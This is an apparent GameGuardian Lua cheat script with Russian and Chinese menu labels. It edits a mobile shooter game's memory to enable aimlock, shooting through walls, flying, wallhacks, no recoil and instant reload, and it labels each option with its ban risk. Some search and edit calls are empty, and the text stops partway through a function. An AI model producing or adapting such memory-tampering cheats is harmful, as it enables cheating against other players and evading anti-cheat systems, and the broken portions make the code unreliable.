  function SearchWrite(Search, Write, Type) gg.clearResults() gg.setVisible(false) gg.searchNumber(Search[1][1], Type) local count = gg.getResultCount() local result = gg.getResults(count) gg.clearResults() local data = {} local base = Search[1][2] if (count > 0) then for i, v in ipairs(result) do v.isUseful = true end for k=2, #Search do local tmp = {} local offset = Search[k][2] - base local num = Search[k][1] for i, v in ipairs(result) do tmp[#tmp+1] = {} tmp[#tmp].address = v.address + offset tmp[#tmp].flags = v.flags end tmp = gg.getValues(tmp) for i, v in ipairs(tmp) do if ( tostring(v.value) ~= tostring(num) ) then result[i].isUseful = false end end end for i, v in ipairs(result) do if (v.isUseful) then data[#data+1] = v.address end end if (#data > 0) then gg.toast("搜索到"..#data.."条数据") local t = {} local base = Search[1][2] for i=1, #data do for k, w in ipairs(Write) do offset = w[2] - base t[#t+1] = {} t[#t].address = data[i] + offset t[#t].flags = Type t[#t].value = w[1] if (w[3] == true) then local item = {} item[#item+1] = t[#t] item[#item].freeze = true gg.addListItems(item) end end end gg.setValues(t) else gg.toast("not found", false) return false end else gg.toast("Not Found") return false end end
  ---------------------------------------------------------------------------------------------------------------ARAN---------------------------------------------------------------------------------------------------------------
 gg.alert("🟡Welcom🟡")
gg.alert("✅UPDATE 16.09.20✅")
 function yiyz_Main()
    SN = gg.choice({
      "🐺Читы для персонажа🐺",
      "🗡️Читы связанные с оружием🗡️",
      "🏠Читы связанные с постройками🏠",
      "🕊️флай🕊️",
      "❌EXIT❌",
    }, nil,"🔥сделал Samp4itok🔥"..sj)
    if SN == 1 then A() end
    if SN == 2 then B() end
    if SN == 3 then C() end
    if SN == 4 then D() end
    if SN == 5 then Exit() end
    XGCK = -1
  end
  ---------------------------------------------------------------------------------------------------------------ARAN---------------------------------------------------------------------------------------------------------------
  function A()
    menu1 = gg.multiChoice({
      "🔥вид персонажа🔥",
      "🔥антенна🔥",
      "🔥игроки белые 2🔥[CAN BAN 25%] ",
      "🔥игроки белые🔥",
      "🔥чёрное небо небо🔥",
      "🔥Wide View Camera🔥",
      "🔥View is closed🔥",
      "🔥убрать траву🔥",
      "🔥3-step high-jump🔥",
      "🔥Close 3-step high-jump🔥",
      "🔥стрельба сквозь стены🔥 [BAN 70%!!!]",
      "❌Back❌",
    }, nil,"сделал Samp4itok"..sj)
    if menu1 == nil then else
      if menu1[1] == true then A1() end
      if menu1[2] == true then A2() end
      if menu1[3] == true then A3() end
      if menu1[4] == true then A4() end
      if menu1[5] == true then A5() end
      if menu1[6] == true then A6() end
      if menu1[7] == true then A7() end
      if menu1[8] == true then A8() end
      if menu1[9] == true then A9() end
      if menu1[10] == true then A10() end
      if menu1[11] == true then A11() end
      if menu1[12] == true then HOME() end
    end
    GLWW=-1
  end
  ---------------------------------------------------------------------------------------------------------------ARAN---------------------------------------------------------------------------------------------------------------
  function B()
    menu2 = gg.multiChoice({
      " 🔥АимЛок 75%🔥 ",
      " 🔥Full АимЛок🔥 ",
      " 🔥что то с прицелом🔥 ", 
      " ❌назад❌",
    }, nil,"сделал Samp4itok"..sj)
    if menu2 == nil then else
      if menu2[1] == true then B1() end
      if menu2[2] == true then B2() end
      if menu2[3] == true then B3() end
      if menu2[4] == true then HOME() end
    end
    GLWW=-1
  end
  ---------------------------------------------------------------------------------------------------------------ARAN---------------------------------------------------------------------------------------------------------------
    function C()
    menu4 = gg.multiChoice({
      " 🔥высокий прыжёк🔥[ban 60%] ",
      " 🔥дома антенна [ON]🔥 ",
      " 🔥дома антенна [OFF]🔥 ",
      " 🔥текстуры дома частично прозрачные [ON]🔥 [Ban 50%] ",
      " 🔥текстуры дома прозрачные[OFF]🔥 ",
      " 🔥прохождение сквозь текстуры🔥 [Ban...] ",
      " 🔥строительство под водой🔥[Glitch-BAN] ",
      " ❌назад❌ ",
    }, nil,"сделал Samp4itok"..sj)
    if menu4 == nil then else
      if menu4[1] == true then C1() end
      if menu4[2] == true then C2() end
      if menu4[3] == true then C3() end
      if menu4[4] == true then C4() end
      if menu4[5] == true then C5() end
      if menu4[6] == true then C6() end
      if menu4[7] == true then C7() end
      if menu4[8] == true then HOME() end
    end
    GLWW=-1
   end
  ---------------------------------------------------------------------------------------------------------------ARAN---------------------------------------------------------------------------------------------------------------
  function D()
    menu6 = gg.multiChoice({
   " 🕊️Fly [ON]🕊 [BAN 90%]️",
   " 🕊️Fly [OFF]🕊️",
   " ❌BACK❌ ",
    }, nil,"сделал Samp4itok"..sj)
    if menu6 == nil then else
      if menu6[1] == true then D1() end
      if menu6[2] == true then D2() end
      if menu6[3] == true then HOME() end
    end
    GLWW=-1
  end
  ---------------------------------------------------------------------------------------------------------------ARAN---------------------------------------------------------------------------------------------------------------
function A1()
    gg.clearResults()
    gg.setRanges(4)
    gg.searchNumber("0.16947640479", gg.REGION_C_BSS, false, gg.SIGN_FUZZY_EQUAL, 0, -1)
    gg.getResults(999)
    gg.editAll("-999", gg.REGION_C_BSS)
    gg.clearResults()
    gg.setRanges(4)
    gg.searchNumber("0.16947640479", gg.REGION_C_BSS, false, gg.SIGN_FUZZY_EQUAL, 0, -1)
    gg.getResults(999)
    gg.editAll("-999", gg.REGION_C_BSS)
    gg.clearResults()
    gg.toast("почти")
    gg.setRanges(16384)
    SearchWrite({{-2.7859868E28, 0},{0.0549999997, -4},{0.04044999927, -8}}, {{2,-4,false}},
    gg.REGION_C_BSS, ("почти"))
    gg.clearList()
    gg.setRanges(131072)
    local dataType = gg.TYPE_FLOAT
    local tb1 = {{2.8133308748863622E-40, 0}, {2.2500030994415283,-12},{7.105437521996369E-15, 8},}
    local tb2 = {{0,0,false},} 
    SearchWrite(tb1, tb2, dataType)
    gg.clearResults()
    gg.clearList("✔️✔️✔️готово✔️✔️✔️" )
  end
  function A2()
    gg.clearResults()
  gg.setRanges(gg.REGION_C_ALLOC) 
  gg.searchNumber("1.464~1.465", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.getResults(1000)
  gg.editAll("-9995", gg.TYPE_FLOAT)
  gg.clearResults(true)
  gg.toast("✔️✔️готово✔️✔️")
  end
function A3()
    gg.clearResults()
  gg.setRanges(gg.REGION_BAD)
  gg.searchNumber("2;-1;1;0.00001;1.0e-7", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.searchNumber("1", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.getResults(100)
  gg.editAll("999", gg.TYPE_FLOAT)
  gg.toast("готово")
  gg.clearResults()
  end
function A4()
  gg.clearResults()
  gg.setRanges(gg.REGION_C_ALLOC) 
  gg.searchNumber("0.5;0.60000002384;0.30000001192;0.27000001073;0.60000002384", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.getResults(1000)
  gg.searchNumber("0.30000001192", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.getResults(1000)
  gg.editAll("20", gg.TYPE_FLOAT)
  gg.clearResults(true)
  gg.toast("✔️✔️готово✔️✔️")
end
  function A5()
gg.clearResults()
gg.setRanges(gg.REGION_C_ALLOC)
local dataType = gg.TYPE_FLOAT
local tb1 = {{24.0, 0}, {1.0,-36},{1.0, -32},{1.0, -32},{1.210721873176642E-42,-8},}
local tb2 = {{0,0,false},} 
 SearchWrite(tb1, tb2, dataType)
gg.clearResults()
gg.clearList()
end
  function A6()
    gg.setRanges(32)
    local dataType = gg.TYPE_FLOAT
    local tb1 = {{6, 0}, {0.0,-12},{1.0,16},{-70,20},}
    local tb2 = {{1.850000023841858,0,false},}
    SearchWrite(tb1, tb2, dataType)
    gg.clearResults()
    gg.clearList()
    gg.toast("视角变大")
  end
  function A7()
    gg.setRanges(32)
    local dataType = gg.TYPE_FLOAT
    local tb1 = {{1.7000000476837158, 0}, {0.20000000298023224,-12},{1.5,-8},}
    local tb2 = {{8,0,false},}
    SearchWrite(tb1, tb2, dataType)
    gg.clearResults()
    gg.clearList()
    gg.toast("关闭视角")
  end
function A8()
gg.setRanges(131072)
local dataType = gg.TYPE_FLOAT
local tb1 = {{3.731405576773409E-40, 0},{9.241521333268239E-40, -8},{4.851497632035286E21, 12},}
local tb2 = {{0,0,false},} 
 SearchWrite(tb1, tb2, dataType)
gg.clearList()
gg.clearResults()
end
  function A9()
    gg.clearResults()
    gg.setRanges(16384)
    local Name="三段跳"
    local dataType = gg.TYPE_FLOAT
    local tb1 = {{-3.8685732E25, 19100}, {1, 19104},{1.00999999046, 19120},}
    local tb2 = {{0.10000000149,19104,false},}
    SearchWrite(tb1, tb2, dataType,Name)
    gg.clearList()
    gg.toast("三段跳打开")
  end
  function A10()
    gg.clearResults()
    gg.setRanges(16384)
    local Name="三段跳关闭"
    local dataType = gg.TYPE_FLOAT
    local tb1 = {{-3.8685732E25, 19100}, {0.10000000149, 19104},{1.00999999046, 19120},}
    local tb2 = {{1,19104,false},}
    SearchWrite(tb1, tb2, dataType,Name)
    gg.clearResults()
    gg.toast("三段跳关闭")
  end
function A11()
 	gg.clearResults()
 
gg.setRanges(gg.REGION_BAD)
 
gg.searchNumber("-1.0e32;999.0;0.39999997616;1.0e32", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
 	 
gg.searchNumber("1.0e32", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
 	 jg=gg.getResults(100)
	 sl=gg.getResultCount()
	 if sl>100 then sl=100 end
	 for i = 1, sl do
 	 	 dzy=jg[i].address
 	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_FLOAT,freeze = true,value = 8}})
 	 end
 	 gg.toast("子弹穿墙50%")
 	 gg.clearResults()
 gg.clearResults()
    gg.setRanges(gg.REGION_C_ALLOC)
 
gg.searchNumber("1.03999996185", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
 
gg.searchNumber("1.03999996185", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
 gg.getResults(20)
 
gg.editAll("5", gg.TYPE_FLOAT)
 gg.clearResults()
 gg.toast("子弹穿墙100%")
 end
  ---------------------------------------------------------------------------------------------------------------ARAN---------------------------------------------------------------------------------------------------------------
function B1()
    gg.setRanges(16384)
    gg.searchNumber("953,270,745", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
    gg.getResults(999)
    gg.editAll("0.00010002004", gg.TYPE_FLOAT)
    gg.toast("注入指针防封")
    gg.clearResults()
    local Name="自瞄"
    local dataType = gg.TYPE_FLOAT
    local tb1 = {{0.00048828148, 0x20C},{-128.00001525879, 0xB44},{128.37501525879, 0xB4C}}
    local tp2 = {{0, 0x11C, true},}
    local tb2 = {{128.37501525879, 0xB44, false},{-128.00001525879, 0xB4C, false},}
    SearchWrite(tb1, tp2, dataType,Name)
    gg.clearList()
    gg.setRanges(32)
    gg.searchNumber("0.11078428477", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
    gg.clearResults()
    gg.clearResults()
    gg.setRanges(gg.REGION_C_ALLOC)
    gg.searchNumber("", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
    gg.searchNumber("", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
    gg.getResults(99)
    gg.editAll("", gg.TYPE_FLOAT)
    gg.toast("自瞄开启中")
    gg.clearResults()
    gg.toast("自瞄开启成功")
  end
function B2()
 
gg.setRanges(16384)
 local Name="自瞄"
 local dataType = gg.TYPE_FLOAT
 local tb1 = {{0.00048828148, 0x20C},{-128.00001525879, 0xB44},{128.37501525879, 0xB4C}}
 local tb2 = {{0, 0x11C, true},}
 SearchWrite(tb1, tb2, dataType,Name)
 gg.clearList()
 end
function B3()
    gg.setRanges(32)
    SearchWrite({{600, 116},{-1, 120},{83, 104}}, {{480,116,false}},
    gg.REGION_C_BSS, ("手枪射速加快"))
    gg.clearList()
    SearchWrite({{18, 212},{15, 224},{3, 240}}, {{0.01,224,false}},
    gg.REGION_C_BSS, ("手枪无后"))
    gg.clearList()
    SearchWrite({{6, 40},{300, 52},{-0.5, 64}}, {{1000000000,52,false}},
    gg.REGION_C_BSS, ("手枪瞬击"))
    gg.clearList()
    gg.toast("手枪全开成功")
  gg.clearResults()
  gg.setRanges(gg.REGION_ANONYMOUS)
  gg.searchNumber("0.60000002384;0.5;43.0;238.0;100;", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.searchNumber("0.5", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.getResults(999)
  gg.editAll("0", gg.TYPE_FLOAT)
  gg.clearResults()
  gg.setRanges(32)
  gg.searchNumber("4,525,216,907,494,477,005Q;4,575,657,222,462,033,101Q;4,539,628,425,454,813,184Q;4,539,628,425,446,424,576Q;4,546,834,186,568,204,288Q;4,768,186,106,537,154,970Q", gg.TYPE_QWORD, false, gg.SIGN_EQUAL, 0, -1)
  gg.searchNumber("", gg.TYPE_QWORD, false, gg.SIGN_EQUAL, 0, -1)
  gg.getResults(100)
  gg.editAll("0", gg.TYPE_QWORD)
  gg.clearResults()
  gg.setRanges(32)
  gg.searchNumber("1.20000004768F;43.0F;40.0F;300.0F", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.searchNumber("300", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.getResults(100)
  gg.editAll("500000", gg.TYPE_FLOAT)
  gg.clearResults()
  gg.setRanges(gg.REGION_C_ALLOC)
  gg.searchNumber("864D;2::10", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.searchNumber("2", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.getResults(999)
  gg.editAll("0.1", gg.TYPE_FLOAT)
  gg.toast("SMG无后瞬击秒换弹")
    gg.setRanges(32)
    SearchWrite({{40, 3908},{7, 3920},{15, 3932}}, {{0.00999999978,3920,true}},
    gg.REGION_C_BSS, ("改装无后"))
    gg.clearList()
    SearchWrite({{-0.20000000298, 0},{1, -8},{360, -12}}, {{1.0E19,-12,false}},
    gg.REGION_C_BSS, ("改装瞬击"))
    gg.clearList()
    SearchWrite({{290, 132},{100, 136},{80, 144}}, {{60,144,false}},
    gg.REGION_C_BSS, ("改装射速加快"))
    gg.clearList()
    gg.setRanges(4)
    SearchWrite({{2.76666688919, 88},{1.2107219E-42, 80}}, {{0.00999999978,88,true}}, 
    gg.REGION_C_BSS, ("改装秒换弹"))
    gg.clearList()
    gg.clearResults()
gg.setRanges(gg.REGION_C_ALLOC)
  gg.searchNumber("", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.searchNumber("", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.getResults(99)
  gg.editAll("", gg.TYPE_FLOAT)
  gg.toast("改装无后瞬击秒换弹")
  gg.clearResults()
    gg.clearResults()
    gg.setRanges(4)
    local dataType = gg.TYPE_FLOAT
    local tb1 = {{2.16666674614, 152}, {1.2107219E-42, 144},}
    local tb2 = {{0.00999999978, 152,false},}
    SearchWrite(tb1, tb2, dataType)
    gg.clearList()
    gg.setRanges(gg.REGION_ANONYMOUS)
    local dataType = gg.TYPE_FLOAT
    local tb1 = {{10, 0x40}, {0.10000000149, 0x14},{5, 0x50},}
    local tb2 = {{0.00999999978, 0x40, false},}
    SearchWrite(tb1, tb2, dataType)
    gg.setRanges(32)
    local dataType = gg.TYPE_FLOAT
    local tb1 = {{-0.60000002384, 32},{480, 20},{80, 4},}
    local tb2 = {{1000000,20,false},}
    SearchWrite(tb1, tb2, dataType)
    gg.clearList()
    gg.clearResults()
    gg.toast("半自动无后瞬击秒换")
    gg.setRanges(32)
    SearchWrite({{-20, 64},{5, 48},{10, 32}}, {{0.00999999978,32,false}},
    gg.REGION_C_BSS, ("AK无后"))
    gg.clearList()
    SearchWrite({{480, 228},{1, 232},{0.375, 248}}, {{1000000000,228,false}},
    gg.REGION_C_BSS, ("AK瞬击"))
    gg.clearList()
    gg.setRanges(4)
    SearchWrite({{2.16666674614, 152},{1.2107219E-42, 144}}, {{0.00999999978,152,true}}, 
    gg.REGION_C_BSS, ("AK秒换弹%50"))
    gg.clearList()
    SearchWrite({{2.66666674614, 24},{1.2107219E-42, 16}}, {{0.00999999978,24,false}},
    gg.REGION_C_BSS, ("AK秒换弹%100"))
    gg.clearList()
    gg.clearResults()
gg.setRanges(gg.REGION_C_ALLOC)
  gg.searchNumber("", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.searchNumber("", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.getResults(99)
  gg.editAll("", gg.TYPE_FLOAT)
  gg.toast("AK无后瞬击秒换弹")
  gg.clearResults()
    gg.setRanges(32)
    SearchWrite({{0.10000000149, 36},{6, 80},{4, 96}}, {{0.00999999978,80,false}},
    gg.REGION_C_BSS, ("QBZ无后"))
    gg.clearList()
    SearchWrite({{0.375, 0},{540, -20},{-0.5, -8}}, {{1000000000,-20,false}},
    gg.REGION_C_BSS, ("QBZ瞬击"))
    gg.clearList()
 	gg.setRanges(4)
    SearchWrite({{2.90000009537, 152},{1.2107219E-42, 144}}, {{0.00999999978,152,false}},
    gg.REGION_C_BSS, ("QBZ秒换弹%50"))
    gg.clearList()
    SearchWrite({{2.03333353996, 216},{1.2107219E-42, 208}}, { {0.00999999978,216,false}}, 
    gg.REGION_C_BSS, ("QBZ秒换弹%100"))
    gg.clearList()
    gg.clearResults()
gg.setRanges(gg.REGION_C_ALLOC)
  gg.searchNumber("", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.searchNumber("", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.getResults(99)
  gg.editAll("", gg.TYPE_FLOAT)
  gg.toast("QBZ无后瞬击秒换弹")
  gg.clearResults()
 gg.setRanges(32)
    SearchWrite({{0.10000000149, 36},{6, 80},{4, 96}}, {{0.00999999978,80,false}},
    gg.REGION_C_BSS, ("m4无后"))
    gg.clearList()
    SearchWrite({{480, 228},{1, 232},{0.375, 248}}, {{1000000000,228,false}},
    gg.REGION_C_BSS, ("M4瞬击"))
    gg.clearList()
    gg.setRanges(4)
    SearchWrite({{2.16666674614, 152},{1.2107219E-42, 144}}, {{0.00999999978,152,true}}, 
    gg.REGION_C_BSS, ("M4秒换弹%50"))
    gg.clearList()
    SearchWrite({{2.66666674614, 24},{1.2107219E-42, 16}}, {{0.00999999978,24,false}},
    gg.REGION_C_BSS, ("M4秒换弹%100"))
    gg.clearList()
    gg.clearResults()
gg.setRanges(gg.REGION_C_ALLOC)
  gg.searchNumber("", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.searchNumber("", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.getResults(99)
  gg.editAll("", gg.TYPE_FLOAT)
  gg.toast("M4无后瞬击秒换弹")
  gg.clearResults()
end
    function B4()
      gg.setRanges(4)
      SearchWrite({
        {-1.9999999494757503E-4, 0},
        {9.999999747378752E-5, 4},
        {-0.3140000104904175, 8},
        {0.02710000053048134, 12}
      }, {
        {-3.2135418, 8}
      }, 16)
    end
  function B5()
     gg.clearResults()
     gg.setRanges(gg.REGION_C_ALLOC)
     gg.searchNumber("0.11000000000~0.11000090000", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
     gg.searchNumber("0.11000000000~0.11000090000", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
     gg.getResults(999)
     gg.editAll("0.1888888888~1888888899", gg.TYPE_FLOAT)
     gg.setVisible(false)
     gg.toast("辅助小范围")
        gg.clearResults()
     gg.setRanges(gg.REGION_C_ALLOC)
     gg.searchNumber("0.11000000000~0.11000090000", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
     gg.searchNumber("0.11000000000~0.11000090000", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
     gg.getResults(999)
     gg.editAll("0.1888888888~0.1888888899", gg.TYPE_FLOAT)
     gg.setVisible(false)
     gg.toast("小范围")
        gg.clearResults()
     gg.setRanges(gg.REGION_C_ALLOC)
     gg.searchNumber("0.11000000000~0.11000090000", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
     gg.searchNumber("0.11000000000~0.11000090000", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
     gg.getResults(999)
     gg.editAll("0.1888888888", gg.TYPE_FLOAT)
     gg.setVisible(false)
     gg.toast("辅助小范围")
       gg.clearResults()
     gg.setRanges(gg.REGION_C_ALLOC)
     gg.searchNumber("0.11000000000~0.11000090000", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
     gg.searchNumber("0.11000000000~0.11000090000", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
     gg.getResults(999)
     gg.editAll("0.1888888888", gg.TYPE_FLOAT)
     gg.setVisible(false)
     gg.toast("辅助小范围")
  end
  function B6()
  gg.clearResults()
  gg.setRanges(gg.REGION_C_ALLOC)
  gg.searchNumber("0.11000000000~0.11000090000", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.searchNumber("0.11000000000~0.11000090000", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.getResults(999)
  gg.editAll("5", gg.TYPE_FLOAT)
  gg.clearResults()
end
function B7()
 gg.clearResults()
 
gg.setRanges(gg.REGION_C_ALLOC)
 
gg.searchNumber("864D;4::10", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
 
gg.searchNumber("4",gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
 gg.getResults(100)
 
gg.editAll("3.8766666",gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
 gg.toast("50％")
 gg.clearResults()
 
gg.setRanges(gg.REGION_C_ALLOC)
 
gg.searchNumber("864D;8::10", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
 
gg.searchNumber("8", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
 gg.getResults(100)
 
gg.editAll("4.99999999",gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
 gg.toast("打药加速开启成功")
 end
function B8()
    gg.clearResults()
    gg.setRanges(gg.REGION_CODE_APP)
    gg.searchNumber('-1.83314888e27;-7.15917215e24;2.0:37',gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
    gg.searchNumber('2',gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
    gg.getResults(100)
    gg.editAll('2.5',gg.TYPE_FLOAT)
    gg.toast("开启成功，请进入游戏")
  end
    function B9()
    menu7 = gg.choice({
      "🐳遁地第一步（大厅开启）🐳",
      "🐳遁地第二步（游戏开启）🐳",
      "🐳    返回 列表     🐳",
 },2020, " 小🐳[A-R-A-Z—3.3]BY:小🐳" )
  if menu7 == 1 then ba1() end
  if menu7 == 2 then ba2() end
  if menu7 == 3 then HOME() end
  GLWW=-1
end
  function ba1()
    gg.clearResults()
    gg.setRanges(gg.REGION_CODE_APP)
    gg.searchNumber('-1.83314888e27;-7.15917215e24;2.0:37',gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
    gg.searchNumber('2',gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
    gg.getResults(800)
    gg.editAll('1.96',gg.TYPE_FLOAT)
    gg.toast("开启成功")
  end

  function ba2()
    gg.clearResults()
    gg.setRanges(4)
    gg.searchNumber('16,261W;25W;161W;1W;1.03999996185', gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
    gg.searchNumber('2.222222', gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
    jg = gg.getResults(100)
    sl = gg.getResultCount()
    if 100 < sl then
      sl = 100
    end
    for _FORV_3_ = 1, sl do
      dzy = jg[_FORV_3_].address
      gg.addListItemsX({
        [1] = {
          address = dzy,
          flags = gg.TYPE_FLOAT,
          freeze = true,
          value = 1.1
        }
      })
    end
    gg.toast("手动冻结改2.2人物遁地已开启")
  end
    function B10()
    gg.clearResults()
    gg.setRanges(gg.REGION_CODE_APP)
    gg.searchNumber('-7.4975935e19;-1.0239434e32;2.0:41',gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
    gg.searchNumber('2',gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
    gg.getResults(100)
    gg.editAll('7',gg.TYPE_FLOAT)
    gg.toast("趴下加速开启成功")
  end
  function B11()
    gg.clearResults()
    gg.setRanges(gg.REGION_CODE_APP)
    gg.searchNumber('-7.4975935e19;-1.0239434e32;2.0:41',gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
    gg.searchNumber('7',gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
    gg.getResults(100)
    gg.editAll('2',gg.TYPE_FLOAT)
    gg.toast("关闭加速")
  end
function B12()
 
gg.setRanges(32)
 local dataType = 16
 local tb1 = {{1.2000000476837158, 0}, {0.5, 4}, {1.0, 8}, {2000.0, 16}, }
 local tb2 = {{0, 4}, {0, 8}, }
 SearchWrite(tb1, tb2, dataType)
 
gg.setRanges(32)
 local dataType = 16
 local tb1 = {{1.2000000476837158, 0}, {1.0, 8}, {40.0, 20}, }
 local tb2 = {{99999, 20}, }
 SearchWrite(tb1, tb2, dataType)
gg.toast("火箭筒瞬爆")
 end
  ---------------------------------------------------------------------------------------------------------------ARAN---------------------------------------------------------------------------------------------------------------
function C1()
  gg.clearResults()
  gg.setRanges(gg.REGION_CODE_APP)
  gg.searchNumber("-3.86857323e25;1;1.00999999046", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.searchNumber("1", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.getResults(10)
  gg.editAll("0.1", gg.TYPE_FLOAT)
  gg.toast("高跳50%")
  gg.clearResults()
  gg.setRanges(gg.REGION_C_ALLOC)
  gg.searchNumber("16,256W;1.03~1.042F;16,261W;-26,214W;15,897W::", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
  gg.searchNumber("1.03~1.042", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
   jg=gg.getResults(100)
   sl=gg.getResultCount()
   if sl>100 then sl=100 end
   for i = 1, sl do
   dzy=jg[i].address
   gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_FLOAT,freeze = true,value = 0.37698}})
   end
   gg.toast("高跳100%")
    end
  function C2()
    gg.clearResults()
    gg.setRanges(gg.REGION_BAD)
    gg.searchNumber('0.14822639525;4.0;0.74931889772;0.36428490281:25',gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
    gg.searchNumber('4',gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
    gg.getResults(100)
    gg.editAll('999',gg.TYPE_FLOAT)
    gg.toast("木墙天线开启成功")
    gg.clearResults()
    gg.setRanges(gg.REGION_BAD)
    gg.searchNumber('0.14822684228;4.0;-0.14822591841;4.0:69',gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
    gg.searchNumber('4',gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
    gg.getResults(100)
    gg.editAll('999',gg.TYPE_FLOAT)
    gg.toast("石墙天线开启成功")
    gg.clearResults()
    gg.setRanges(gg.REGION_BAD)
    gg.searchNumber('0.375;2.0;-0.15000064671;4.0;0.0;4.0;4.0;4.0:141',gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
    gg.searchNumber('4',gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
    gg.getResults(100)
    gg.editAll('999',gg.TYPE_FLOAT)
    gg.toast("铁墙天线开启成功")
  end
  function C3()
    gg.clearResults()
    gg.setRanges(gg.REGION_BAD)
    gg.searchNumber('0.14822639525;4.0;0.74931889772;0.36428490281:25',gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
    gg.searchNumber('999',gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
    gg.getResults(100)
    gg.editAll('4',gg.TYPE_FLOAT)
    gg.toast("木墙天线关闭成功")
    gg.clearResults()
    gg.setRanges(gg.REGION_BAD)
    gg.searchNumber('0.14822684228;4.0;-0.14822591841;4.0:69',gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
    gg.searchNumber('999',gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
    gg.getResults(100)
    gg.editAll('4',gg.TYPE_FLOAT)
    gg.toast("石头天线开启关闭")
    gg.clearResults()
    gg.setRanges(gg.REGION_BAD)
    gg.searchNumber('0.375;2.0;-0.15000064671;4.0;0.0;4.0;4.0;4.0:141',gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
    gg.searchNumber('999',gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0, -1)
    gg.getResults(100)
    gg.editAll('4',gg.TYPE_FLOAT)
    gg.toast("铁墙天线关闭成功")
  end
 function C4()
  gg.clearResults()
  gg.setRanges(16384)
  gg.searchNumber("0.81399995089", gg.REGION_C_BSS, false, gg.SIGN_FUZZY_EQUAL, 0, -1)
  gg.searchNumber("0.81399995089", gg.REGION_C_BSS, false, gg.SIGN_FUZZY_EQUAL, 0, -1)
  gg.getResults(100)
  gg.editAll("10.123", gg.REGION_C_BSS)
  gg.toast("房屋透视开启")
  gg.clearResults()
  end
  function C5()
  gg.clearResults()
  gg.setRanges(16384)
